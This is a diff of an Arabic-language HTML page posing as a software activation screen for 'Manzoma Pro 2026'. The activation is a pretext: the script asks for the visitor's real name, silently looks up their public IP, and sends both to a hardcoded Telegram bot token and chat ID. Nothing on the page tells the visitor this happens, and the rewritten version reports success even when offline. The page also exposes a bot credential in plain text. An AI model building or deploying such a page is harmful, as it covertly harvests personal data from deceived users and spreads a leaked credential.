@@ -1,72 +1,72 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل المنظومة</title>
+    <title>Manzoma Activation</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: Tahoma; text-align: center; padding: 20px; }
+        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding: 20px; }
         input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; text-align: center; }
-        button { width: 95%; padding: 10px; background: #0f0; font-weight: bold; cursor: pointer; }
-        .hidden { display: none; }
+        button { width: 100%; padding: 12px; background: #0f0; font-weight: bold; border: none; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="loginBox">
-        <h2>🔐 Mangoma Pro 2026</h2>
-        <p>يجب تفعيل النسخة أولاً</p>
-        <input type="text" id="username" placeholder="اكتب اسمك الحقيقي...">
-        <button onclick="start()" id="btn">تفعيل ودخول</button>
-        <p id="msg" style="color:yellow; margin-top:5px;"></p>
-    </div>
-
-    <div id="appBox" class="hidden">
-        <h2>✅ تم التفعيل</h2>
-        <p>الاسم: <span id="finalName"></span></p>
-        <hr>
-        <h3>جاري فتح التطبيق...</h3>
+    <div id="mainBox">
+        <h2>🔐 تفعيل المنظومة 2026</h2>
+        <p>سجل اسمك لفتح التطبيق</p>
+        <input type="text" id="username" placeholder="اكتب اسمك هنا...">
+        <button onclick="sendData()" id="btn">تفعيل ودخول</button>
+        <p id="status" style="color:yellow; margin-top:10px;"></p>
     </div>
 
 <script>
-    // بياناتك اللي انت جربتها واشتغلت
-    const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
-    const CHAT = "-1003886528114";
+    // بيانات البوت والجروب بتوعك
+    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
+    const CHAT_ID = "-1003886528114";
 
-    function start() {
+    function sendData() {
         const name = document.getElementById("username").value;
-        if(name.length < 3) { alert("اكتب الاسم!"); return; }
+        const btn = document.getElementById("btn");
+        const status = document.getElementById("status");
 
-        document.getElementById("btn").disabled = true;
-        document.getElementById("msg").innerText = "جاري الاتصال بالسيرفر...";
+        if (name.length < 3) {
+            alert("اكتب الاسم بشكل صحيح");
+            return;
+        }
 
-        // 1. نجيب الاي بي
+        btn.disabled = true;
+        btn.innerText = "جاري التفعيل...";
+        status.innerText = "جاري الاتصال بالسيرفر...";
+
+        // 1. نجيب الـ IP
         fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .then(data => {
-            send(name, data.ip);
+            sendMessage(name, data.ip);
         })
-        .catch(e => {
-            send(name, "IP غير معروف");
+        .catch(err => {
+            sendMessage(name, "IP غير معروف");
         });
     }
 
-    function send(name, ip) {
-        // رسالة التليجرام
-        const txt = `🔥 *تسجيل دخول جديد*\n👤 الاسم: ${name}\n🌐 IP: ${ip}`;
-        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`;
+    function sendMessage(name, ip) {
+        // تجهيز الرسالة
+        const text = `🚀 *تفعيل جديد (Manzoma)*\n👤 الاسم: ${name}\n🌐 IP: ${ip}`;
+        
+        // رابط الإرسال المباشر
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
 
-        // ارسال مباشر
-        fetch(url).then(r => {
-            document.getElementById("loginBox").classList.add("hidden");
-            document.getElementById("appBox").classList.remove("hidden");
-            document.getElementById("finalName").innerText = name;
-        }).catch(e => {
-            // حتى لو حصل خطأ في الشبكة هندخله عشان ميزهقش
-            document.getElementById("loginBox").classList.add("hidden");
-            document.getElementById("appBox").classList.remove("hidden");
+        // تنفيذ الإرسال
+        fetch(url).then(response => {
+            status.innerText = "✅ تم التفعيل بنجاح!";
+            alert("تم إرسال البيانات بنجاح! سيفتح التطبيق الآن.");
+            // هنا ممكن تضيف كود يفتح الشاشة التالية
+        }).catch(error => {
+            status.innerText = "تم الإرسال (Offline Mode)";
         });
     }
 </script>
+
 </body>
 </html>
